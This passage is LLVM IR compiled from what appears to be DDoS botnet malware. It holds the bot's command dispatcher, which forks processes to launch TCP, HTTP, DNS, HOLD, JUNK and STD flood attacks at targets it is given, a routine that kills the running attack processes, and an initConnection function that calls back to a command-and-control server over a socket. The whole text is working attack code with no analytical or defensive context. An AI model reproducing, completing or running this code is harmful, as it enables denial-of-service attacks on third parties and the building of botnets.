  %470 = load i32, i32* %21, align 4
  %471 = load i32, i32* %22, align 4
  %472 = load i8*, i8** %23, align 8
  %473 = load i32, i32* %25, align 4
  %474 = load i32, i32* %24, align 4
  call void @sendTCP(i8* noundef %468, i32 noundef %469, i32 noundef %470, i32 noundef %471, i8* noundef %472, i32 noundef %473, i32 noundef %474)
  call void @_exit(i32 noundef 0) #14
  unreachable

475:                                              ; preds = %464
  %476 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %476, i8** %26, align 8
  br label %461, !llvm.loop !70

477:                                              ; preds = %461
  br label %490

478:                                              ; preds = %453
  %479 = call i32 @listFork()
  %480 = icmp ne i32 %479, 0
  br i1 %480, label %489, label %481

481:                                              ; preds = %478
  %482 = load i8*, i8** %19, align 8
  %483 = load i32, i32* %20, align 4
  %484 = load i32, i32* %21, align 4
  %485 = load i32, i32* %22, align 4
  %486 = load i8*, i8** %23, align 8
  %487 = load i32, i32* %25, align 4
  %488 = load i32, i32* %24, align 4
  call void @sendTCP(i8* noundef %482, i32 noundef %483, i32 noundef %484, i32 noundef %485, i8* noundef %486, i32 noundef %487, i32 noundef %488)
  call void @_exit(i32 noundef 0) #14
  unreachable

489:                                              ; preds = %478
  br label %490

490:                                              ; preds = %489, %477
  br label %491

491:                                              ; preds = %490, %362
  %492 = load i8**, i8*** %4, align 8
  %493 = getelementptr inbounds i8*, i8** %492, i64 0
  %494 = load i8*, i8** %493, align 8
  %495 = call i32 @strcmp(i8* noundef %494, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i64 0, i64 0)) #11
  %496 = icmp ne i32 %495, 0
  br i1 %496, label %574, label %497

497:                                              ; preds = %491
  %498 = load i32, i32* %3, align 4
  %499 = icmp slt i32 %498, 6
  br i1 %499, label %500, label %503

500:                                              ; preds = %497
  %501 = load i32, i32* @mainCommSock, align 4
  %502 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %501, i8* noundef getelementptr inbounds ([50 x i8], [50 x i8]* @.str.460, i64 0, i64 0))
  br label %921

503:                                              ; preds = %497
  %504 = load i8**, i8*** %4, align 8
  %505 = getelementptr inbounds i8*, i8** %504, i64 1
  %506 = load i8*, i8** %505, align 8
  %507 = call i8* @strstr(i8* noundef %506, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #11
  %508 = icmp ne i8* %507, null
  br i1 %508, label %509, label %546

509:                                              ; preds = %503
  %510 = load i8**, i8*** %4, align 8
  %511 = getelementptr inbounds i8*, i8** %510, i64 1
  %512 = load i8*, i8** %511, align 8
  %513 = call i8* @strtok(i8* noundef %512, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %513, i8** %27, align 8
  br label %514

514:                                              ; preds = %543, %509
  %515 = load i8*, i8** %27, align 8
  %516 = icmp ne i8* %515, null
  br i1 %516, label %517, label %545

517:                                              ; preds = %514
  %518 = call i32 @listFork()
  %519 = icmp ne i32 %518, 0
  br i1 %519, label %543, label %520

520:                                              ; preds = %517
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 1
  %523 = load i8*, i8** %522, align 8
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 2
  %526 = load i8*, i8** %525, align 8
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 3
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @atoi(i8* noundef %529) #11
  %531 = trunc i32 %530 to i16
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 4
  %534 = load i8*, i8** %533, align 8
  %535 = load i8**, i8*** %4, align 8
  %536 = getelementptr inbounds i8*, i8** %535, i64 5
  %537 = load i8*, i8** %536, align 8
  %538 = call i32 @atoi(i8* noundef %537) #11
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 6
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* noundef %541) #11
  call void @sendHTTP(i8* noundef %523, i8* noundef %526, i16 noundef zeroext %531, i8* noundef %534, i32 noundef %538, i32 noundef %542)
  call void @_exit(i32 noundef 0) #14
  unreachable

543:                                              ; preds = %517
  %544 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %544, i8** %27, align 8
  br label %514, !llvm.loop !71

545:                                              ; preds = %514
  br label %573

546:                                              ; preds = %503
  %547 = call i32 @listFork()
  %548 = icmp ne i32 %547, 0
  br i1 %548, label %549, label %550

549:                                              ; preds = %546
  br label %921

550:                                              ; preds = %546
  %551 = load i8**, i8*** %4, align 8
  %552 = getelementptr inbounds i8*, i8** %551, i64 1
  %553 = load i8*, i8** %552, align 8
  %554 = load i8**, i8*** %4, align 8
  %555 = getelementptr inbounds i8*, i8** %554, i64 2
  %556 = load i8*, i8** %555, align 8
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 3
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @atoi(i8* noundef %559) #11
  %561 = trunc i32 %560 to i16
  %562 = load i8**, i8*** %4, align 8
  %563 = getelementptr inbounds i8*, i8** %562, i64 4
  %564 = load i8*, i8** %563, align 8
  %565 = load i8**, i8*** %4, align 8
  %566 = getelementptr inbounds i8*, i8** %565, i64 5
  %567 = load i8*, i8** %566, align 8
  %568 = call i32 @atoi(i8* noundef %567) #11
  %569 = load i8**, i8*** %4, align 8
  %570 = getelementptr inbounds i8*, i8** %569, i64 6
  %571 = load i8*, i8** %570, align 8
  %572 = call i32 @atoi(i8* noundef %571) #11
  call void @sendHTTP(i8* noundef %553, i8* noundef %556, i16 noundef zeroext %561, i8* noundef %564, i32 noundef %568, i32 noundef %572)
  call void @_exit(i32 noundef 0) #14
  unreachable

573:                                              ; preds = %545
  br label %574

574:                                              ; preds = %573, %491
  %575 = load i8**, i8*** %4, align 8
  %576 = getelementptr inbounds i8*, i8** %575, i64 0
  %577 = load i8*, i8** %576, align 8
  %578 = call i32 @strcmp(i8* noundef %577, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i64 0, i64 0)) #11
  %579 = icmp ne i32 %578, 0
  br i1 %579, label %676, label %580

580:                                              ; preds = %574
  %581 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 255) #12
  store i32 %581, i32* %28, align 4
  %582 = icmp slt i32 %581, 0
  br i1 %582, label %583, label %584

583:                                              ; preds = %580
  call void @exit(i32 noundef 1) #16
  unreachable

584:                                              ; preds = %580
  %585 = load i32, i32* %3, align 4
  %586 = icmp slt i32 %585, 6
  br i1 %586, label %587, label %590

587:                                              ; preds = %584
  %588 = load i32, i32* @mainCommSock, align 4
  %589 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %588, i8* noundef getelementptr inbounds ([91 x i8], [91 x i8]* @.str.462, i64 0, i64 0))
  call void @exit(i32 noundef 0) #16
  unreachable

590:                                              ; preds = %584
  %591 = call i32 @listFork()
  %592 = icmp ne i32 %591, 0
  br i1 %592, label %675, label %593

593:                                              ; preds = %590
  %594 = call i64 @time(i64* noundef null) #12
  %595 = trunc i64 %594 to i32
  call void @srand(i32 noundef %595) #12
  %596 = load i8**, i8*** %4, align 8
  %597 = getelementptr inbounds i8*, i8** %596, i64 4
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 @atoi(i8* noundef %598) #11
  store i32 %599, i32* %29, align 4
  %600 = load i8**, i8*** %4, align 8
  %601 = getelementptr inbounds i8*, i8** %600, i64 5
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @atoi(i8* noundef %602) #11
  store i32 %603, i32* %30, align 4
  store i32 0, i32* %32, align 4
  %604 = load i8**, i8*** %4, align 8
  %605 = getelementptr inbounds i8*, i8** %604, i64 3
  %606 = load i8*, i8** %605, align 8
  %607 = call i32 @download(i8* noundef %606, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i64 0, i64 0))
  %608 = load i32, i32* @mainCommSock, align 4
  %609 = load i8**, i8*** %4, align 8
  %610 = getelementptr inbounds i8*, i8** %609, i64 1
  %611 = load i8*, i8** %610, align 8
  %612 = load i8**, i8*** %4, align 8
  %613 = getelementptr inbounds i8*, i8** %612, i64 2
  %614 = load i8*, i8** %613, align 8
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 6
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @atoi(i8* noundef %617) #11
  %619 = load i8**, i8*** %4, align 8
  %620 = getelementptr inbounds i8*, i8** %619, i64 5
  %621 = load i8*, i8** %620, align 8
  %622 = call i32 @atoi(i8* noundef %621) #11
  %623 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %608, i8* noundef getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i64 0, i64 0), i8* noundef %611, i8* noundef %614, i32 noundef %618, i32 noundef %622)
  %624 = load i32, i32* %29, align 4
  %625 = zext i32 %624 to i64
  %626 = call i8* @llvm.stacksave()
  store i8* %626, i8** %33, align 8
  %627 = alloca %struct.thread_data, i64 %625, align 16
  store i64 %625, i64* %34, align 8
  store i32 0, i32* %31, align 4
  br label %628

628:                                              ; preds = %670, %593
  %629 = load i32, i32* %31, align 4
  %630 = load i32, i32* %29, align 4
  %631 = icmp slt i32 %629, %630
  br i1 %631, label %632, label %673

632:                                              ; preds = %628
  %633 = load i32, i32* %31, align 4
  %634 = load i32, i32* %31, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %627, i64 %635
  %637 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %636, i32 0, i32 0
  store i32 %633, i32* %637, align 16
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 1
  %640 = load i8*, i8** %639, align 8
  %641 = load i32, i32* %31, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %627, i64 %642
  %644 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %643, i32 0, i32 1
  store i8* %640, i8** %644, align 8
  %645 = load i8**, i8*** %4, align 8
  %646 = getelementptr inbounds i8*, i8** %645, i64 2
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 @atoi(i8* noundef %647) #11
  %649 = load i32, i32* %31, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %627, i64 %650
  %652 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %651, i32 0, i32 2
  store i32 %648, i32* %652, align 16
  %653 = load i32, i32* %32, align 4
  %654 = load i32, i32* %31, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %627, i64 %655
  %657 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %656, i32 0, i32 3
  store i32 %653, i32* %657, align 4
  %658 = load i8**, i8*** %4, align 8
  %659 = getelementptr inbounds i8*, i8** %658, i64 6
  %660 = load i8*, i8** %659, align 8
  %661 = call i32 @atoi(i8* noundef %660) #11
  %662 = load i32, i32* %31, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %627, i64 %663
  %665 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %664, i32 0, i32 4
  store i32 %661, i32* %665, align 8
  %666 = load i32, i32* %31, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %627, i64 %667
  %669 = bitcast %struct.thread_data* %668 to i8*
  call void @dnsflood(i8* noundef %669)
  br label %670

670:                                              ; preds = %632
  %671 = load i32, i32* %31, align 4
  %672 = add nsw i32 %671, 1
  store i32 %672, i32* %31, align 4
  br label %628, !llvm.loop !72

673:                                              ; preds = %628
  %674 = load i8*, i8** %33, align 8
  call void @llvm.stackrestore(i8* %674)
  br label %675

675:                                              ; preds = %673, %590
  br label %676

676:                                              ; preds = %675, %574
  %677 = load i8**, i8*** %4, align 8
  %678 = getelementptr inbounds i8*, i8** %677, i64 0
  %679 = load i8*, i8** %678, align 8
  %680 = call i32 @strcmp(i8* noundef %679, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i64 0, i64 0)) #11
  %681 = icmp ne i32 %680, 0
  br i1 %681, label %742, label %682

682:                                              ; preds = %676
  %683 = load i32, i32* %3, align 4
  %684 = icmp slt i32 %683, 4
  br i1 %684, label %697, label %685

685:                                              ; preds = %682
  %686 = load i8**, i8*** %4, align 8
  %687 = getelementptr inbounds i8*, i8** %686, i64 2
  %688 = load i8*, i8** %687, align 8
  %689 = call i32 @atoi(i8* noundef %688) #11
  %690 = icmp slt i32 %689, 1
  br i1 %690, label %697, label %691

691:                                              ; preds = %685
  %692 = load i8**, i8*** %4, align 8
  %693 = getelementptr inbounds i8*, i8** %692, i64 3
  %694 = load i8*, i8** %693, align 8
  %695 = call i32 @atoi(i8* noundef %694) #11
  %696 = icmp slt i32 %695, 1
  br i1 %696, label %697, label %700

697:                                              ; preds = %691, %685, %682
  %698 = load i32, i32* @mainCommSock, align 4
  %699 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %698, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i64 0, i64 0))
  br label %921

700:                                              ; preds = %691
  %701 = load i8**, i8*** %4, align 8
  %702 = getelementptr inbounds i8*, i8** %701, i64 1
  %703 = load i8*, i8** %702, align 8
  store i8* %703, i8** %35, align 8
  %704 = load i8**, i8*** %4, align 8
  %705 = getelementptr inbounds i8*, i8** %704, i64 2
  %706 = load i8*, i8** %705, align 8
  %707 = call i32 @atoi(i8* noundef %706) #11
  store i32 %707, i32* %36, align 4
  %708 = load i8**, i8*** %4, align 8
  %709 = getelementptr inbounds i8*, i8** %708, i64 3
  %710 = load i8*, i8** %709, align 8
  %711 = call i32 @atoi(i8* noundef %710) #11
  store i32 %711, i32* %37, align 4
  %712 = load i8*, i8** %35, align 8
  %713 = call i8* @strstr(i8* noundef %712, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #11
  %714 = icmp ne i8* %713, null
  br i1 %714, label %715, label %733

715:                                              ; preds = %700
  %716 = load i8*, i8** %35, align 8
  %717 = call i8* @strtok(i8* noundef %716, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %717, i8** %38, align 8
  br label %718

718:                                              ; preds = %730, %715
  %719 = load i8*, i8** %38, align 8
  %720 = icmp ne i8* %719, null
  br i1 %720, label %721, label %732

721:                                              ; preds = %718
  %722 = call i32 @listFork()
  %723 = icmp ne i32 %722, 0
  br i1 %723, label %730, label %724

724:                                              ; preds = %721
  %725 = load i8*, i8** %38, align 8
  %726 = load i32, i32* %36, align 4
  %727 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* noundef %725, i32 noundef %726, i32 noundef %727)
  %728 = load i32, i32* @mainCommSock, align 4
  %729 = call i32 @close(i32 noundef %728)
  call void @_exit(i32 noundef 0) #14
  unreachable

730:                                              ; preds = %721
  %731 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %731, i8** %38, align 8
  br label %718, !llvm.loop !73

732:                                              ; preds = %718
  br label %741

733:                                              ; preds = %700
  %734 = call i32 @listFork()
  %735 = icmp ne i32 %734, 0
  br i1 %735, label %736, label %737

736:                                              ; preds = %733
  br label %921

737:                                              ; preds = %733
  %738 = load i8*, i8** %35, align 8
  %739 = load i32, i32* %36, align 4
  %740 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* noundef %738, i32 noundef %739, i32 noundef %740)
  call void @_exit(i32 noundef 0) #14
  unreachable

741:                                              ; preds = %732
  br label %742

742:                                              ; preds = %741, %676
  %743 = load i8**, i8*** %4, align 8
  %744 = getelementptr inbounds i8*, i8** %743, i64 0
  %745 = load i8*, i8** %744, align 8
  %746 = call i32 @strcmp(i8* noundef %745, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.466, i64 0, i64 0)) #11
  %747 = icmp ne i32 %746, 0
  br i1 %747, label %802, label %748

748:                                              ; preds = %742
  %749 = load i32, i32* %3, align 4
  %750 = icmp slt i32 %749, 3
  br i1 %750, label %757, label %751

751:                                              ; preds = %748
  %752 = load i8**, i8*** %4, align 8
  %753 = getelementptr inbounds i8*, i8** %752, i64 3
  %754 = load i8*, i8** %753, align 8
  %755 = call i32 @atoi(i8* noundef %754) #11
  %756 = icmp slt i32 %755, 0
  br i1 %756, label %757, label %760

757:                                              ; preds = %751, %748
  %758 = load i32, i32* @mainCommSock, align 4
  %759 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %758, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.467, i64 0, i64 0))
  br label %921

760:                                              ; preds = %751
  %761 = load i8**, i8*** %4, align 8
  %762 = getelementptr inbounds i8*, i8** %761, i64 1
  %763 = load i8*, i8** %762, align 8
  store i8* %763, i8** %39, align 8
  %764 = load i8**, i8*** %4, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 2
  %766 = load i8*, i8** %765, align 8
  %767 = call i32 @atoi(i8* noundef %766) #11
  store i32 %767, i32* %40, align 4
  %768 = load i8**, i8*** %4, align 8
  %769 = getelementptr inbounds i8*, i8** %768, i64 3
  %770 = load i8*, i8** %769, align 8
  %771 = call i32 @atoi(i8* noundef %770) #11
  store i32 %771, i32* %41, align 4
  %772 = load i8*, i8** %39, align 8
  %773 = call i8* @strstr(i8* noundef %772, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #11
  %774 = icmp ne i8* %773, null
  br i1 %774, label %775, label %793

775:                                              ; preds = %760
  %776 = load i8*, i8** %39, align 8
  %777 = call i8* @strtok(i8* noundef %776, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %777, i8** %42, align 8
  br label %778

778:                                              ; preds = %790, %775
  %779 = load i8*, i8** %42, align 8
  %780 = icmp ne i8* %779, null
  br i1 %780, label %781, label %792

781:                                              ; preds = %778
  %782 = call i32 @listFork()
  %783 = icmp ne i32 %782, 0
  br i1 %783, label %790, label %784

784:                                              ; preds = %781
  %785 = load i8*, i8** %42, align 8
  %786 = load i32, i32* %40, align 4
  %787 = load i32, i32* %41, align 4
  call void @sendJUNK(i8* noundef %785, i32 noundef %786, i32 noundef %787)
  %788 = load i32, i32* @mainCommSock, align 4
  %789 = call i32 @close(i32 noundef %788)
  call void @_exit(i32 noundef 0) #14
  unreachable

790:                                              ; preds = %781
  %791 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %791, i8** %42, align 8
  br label %778, !llvm.loop !74

792:                                              ; preds = %778
  br label %801

793:                                              ; preds = %760
  %794 = call i32 @listFork()
  %795 = icmp ne i32 %794, 0
  br i1 %795, label %796, label %797

796:                                              ; preds = %793
  br label %921

797:                                              ; preds = %793
  %798 = load i8*, i8** %39, align 8
  %799 = load i32, i32* %40, align 4
  %800 = load i32, i32* %41, align 4
  call void @sendJUNK(i8* noundef %798, i32 noundef %799, i32 noundef %800)
  call void @_exit(i32 noundef 0) #14
  unreachable

801:                                              ; preds = %792
  br label %802

802:                                              ; preds = %801, %742
  %803 = load i8**, i8*** %4, align 8
  %804 = getelementptr inbounds i8*, i8** %803, i64 0
  %805 = load i8*, i8** %804, align 8
  %806 = call i32 @strcmp(i8* noundef %805, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.468, i64 0, i64 0)) #11
  %807 = icmp ne i32 %806, 0
  br i1 %807, label %866, label %808

808:                                              ; preds = %802
  %809 = load i32, i32* %3, align 4
  %810 = icmp slt i32 %809, 4
  br i1 %810, label %823, label %811

811:                                              ; preds = %808
  %812 = load i8**, i8*** %4, align 8
  %813 = getelementptr inbounds i8*, i8** %812, i64 2
  %814 = load i8*, i8** %813, align 8
  %815 = call i32 @atoi(i8* noundef %814) #11
  %816 = icmp slt i32 %815, 1
  br i1 %816, label %823, label %817

817:                                              ; preds = %811
  %818 = load i8**, i8*** %4, align 8
  %819 = getelementptr inbounds i8*, i8** %818, i64 3
  %820 = load i8*, i8** %819, align 8
  %821 = call i32 @atoi(i8* noundef %820) #11
  %822 = icmp slt i32 %821, 1
  br i1 %822, label %823, label %826

823:                                              ; preds = %817, %811, %808
  %824 = load i32, i32* @mainCommSock, align 4
  %825 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %824, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i64 0, i64 0))
  br label %921

826:                                              ; preds = %817
  %827 = load i8**, i8*** %4, align 8
  %828 = getelementptr inbounds i8*, i8** %827, i64 1
  %829 = load i8*, i8** %828, align 8
  store i8* %829, i8** %43, align 8
  %830 = load i8**, i8*** %4, align 8
  %831 = getelementptr inbounds i8*, i8** %830, i64 2
  %832 = load i8*, i8** %831, align 8
  %833 = call i32 @atoi(i8* noundef %832) #11
  store i32 %833, i32* %44, align 4
  %834 = load i8**, i8*** %4, align 8
  %835 = getelementptr inbounds i8*, i8** %834, i64 3
  %836 = load i8*, i8** %835, align 8
  %837 = call i32 @atoi(i8* noundef %836) #11
  store i32 %837, i32* %45, align 4
  %838 = load i8*, i8** %43, align 8
  %839 = call i8* @strstr(i8* noundef %838, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #11
  %840 = icmp ne i8* %839, null
  br i1 %840, label %841, label %857

841:                                              ; preds = %826
  %842 = load i8*, i8** %43, align 8
  %843 = call i8* @strtok(i8* noundef %842, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %843, i8** %46, align 8
  br label %844

844:                                              ; preds = %854, %841
  %845 = load i8*, i8** %46, align 8
  %846 = icmp ne i8* %845, null
  br i1 %846, label %847, label %856

847:                                              ; preds = %844
  %848 = call i32 @listFork()
  %849 = icmp ne i32 %848, 0
  br i1 %849, label %854, label %850

850:                                              ; preds = %847
  %851 = load i8*, i8** %46, align 8
  %852 = load i32, i32* %44, align 4
  %853 = load i32, i32* %45, align 4
  call void @sendSTD(i8* noundef %851, i32 noundef %852, i32 noundef %853)
  call void @_exit(i32 noundef 0) #14
  unreachable

854:                                              ; preds = %847
  %855 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %855, i8** %46, align 8
  br label %844, !llvm.loop !75

856:                                              ; preds = %844
  br label %865

857:                                              ; preds = %826
  %858 = call i32 @listFork()
  %859 = icmp ne i32 %858, 0
  br i1 %859, label %860, label %861

860:                                              ; preds = %857
  br label %921

861:                                              ; preds = %857
  %862 = load i8*, i8** %43, align 8
  %863 = load i32, i32* %44, align 4
  %864 = load i32, i32* %45, align 4
  call void @sendSTD(i8* noundef %862, i32 noundef %863, i32 noundef %864)
  call void @_exit(i32 noundef 0) #14
  unreachable

865:                                              ; preds = %856
  br label %866

866:                                              ; preds = %865, %802
  %867 = load i8**, i8*** %4, align 8
  %868 = getelementptr inbounds i8*, i8** %867, i64 0
  %869 = load i8*, i8** %868, align 8
  %870 = call i32 @strcmp(i8* noundef %869, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i64 0, i64 0)) #11
  %871 = icmp ne i32 %870, 0
  br i1 %871, label %914, label %872

872:                                              ; preds = %866
  store i32 0, i32* %47, align 4
  store i64 0, i64* %48, align 8
  br label %873

873:                                              ; preds = %900, %872
  %874 = load i64, i64* %48, align 8
  %875 = load i32, i32* @numpids, align 4
  %876 = sext i32 %875 to i64
  %877 = icmp ult i64 %874, %876
  br i1 %877, label %878, label %903

878:                                              ; preds = %873
  %879 = load i32*, i32** @pids, align 8
  %880 = load i64, i64* %48, align 8
  %881 = getelementptr inbounds i32, i32* %879, i64 %880
  %882 = load i32, i32* %881, align 4
  %883 = icmp ne i32 %882, 0
  br i1 %883, label %884, label %899

884:                                              ; preds = %878
  %885 = load i32*, i32** @pids, align 8
  %886 = load i64, i64* %48, align 8
  %887 = getelementptr inbounds i32, i32* %885, i64 %886
  %888 = load i32, i32* %887, align 4
  %889 = call i32 @getpid() #12
  %890 = icmp ne i32 %888, %889
  br i1 %890, label %891, label %899

891:                                              ; preds = %884
  %892 = load i32*, i32** @pids, align 8
  %893 = load i64, i64* %48, align 8
  %894 = getelementptr inbounds i32, i32* %892, i64 %893
  %895 = load i32, i32* %894, align 4
  %896 = call i32 @kill(i32 noundef %895, i32 noundef 9) #12
  %897 = load i32, i32* %47, align 4
  %898 = add nsw i32 %897, 1
  store i32 %898, i32* %47, align 4
  br label %899

899:                                              ; preds = %891, %884, %878
  br label %900

900:                                              ; preds = %899
  %901 = load i64, i64* %48, align 8
  %902 = add i64 %901, 1
  store i64 %902, i64* %48, align 8
  br label %873, !llvm.loop !76

903:                                              ; preds = %873
  %904 = load i32, i32* %47, align 4
  %905 = icmp sgt i32 %904, 0
  br i1 %905, label %906, label %910

906:                                              ; preds = %903
  %907 = load i32, i32* @mainCommSock, align 4
  %908 = load i32, i32* %47, align 4
  %909 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %907, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i64 0, i64 0), i32 noundef %908)
  br label %913

910:                                              ; preds = %903
  %911 = load i32, i32* @mainCommSock, align 4
  %912 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %911, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.472, i64 0, i64 0))
  br label %913

913:                                              ; preds = %910, %906
  br label %914

914:                                              ; preds = %913, %866
  %915 = load i8**, i8*** %4, align 8
  %916 = getelementptr inbounds i8*, i8** %915, i64 0
  %917 = load i8*, i8** %916, align 8
  %918 = call i32 @strcmp(i8* noundef %917, i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i64 0, i64 0)) #11
  %919 = icmp ne i32 %918, 0
  br i1 %919, label %921, label %920

920:                                              ; preds = %914
  call void @exit(i32 noundef 0) #16
  unreachable

921:                                              ; preds = %914, %860, %823, %796, %757, %736, %697, %549, %500, %413, %361, %271, %206, %166, %161, %153, %138, %120, %110, %101
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i64 @sysconf(i32 noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 4096, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @cncServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* noundef %20, i8* noundef %24) #12
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* noundef %26, i32 noundef 58) #11
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* noundef %30, i32 noundef 58) #11
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* noundef %32) #11
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* noundef %34, i32 noundef 58) #11
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
  %37 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 noundef %38, i8* noundef %39, i32 noundef %40, i32 noundef 30)
  %42 = icmp ne i32 %41, 0
